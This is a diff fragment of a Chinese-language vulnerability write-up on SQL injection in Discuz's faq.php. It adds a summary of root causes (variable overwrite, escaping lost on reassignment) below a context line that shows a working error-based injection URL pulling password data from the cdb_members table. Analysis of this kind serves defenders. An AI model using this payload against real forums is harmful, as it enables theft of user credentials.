@@ -68,6 +68,10 @@ Tags: code
     faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat((select%20count(password)%20from%20cdb_members%20limit 1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23
 
 
+#### **4、总结**
 
+无巧不成书，种种错误造就了这个漏洞，还好版本相对较低，影响还不太大，总结一下原因
 
+1、变量没有定义并初始化就使用，导致用户输入数据可以变量覆盖，输入信息可控。
 
+2、虽然对用户输入信息有转义处理，但重新赋值给新的变量时，忽视了，将单个转义字符带入sql中。结果，转义字符就会吞食sql语句中一个单引号字符，导致逻辑改变。
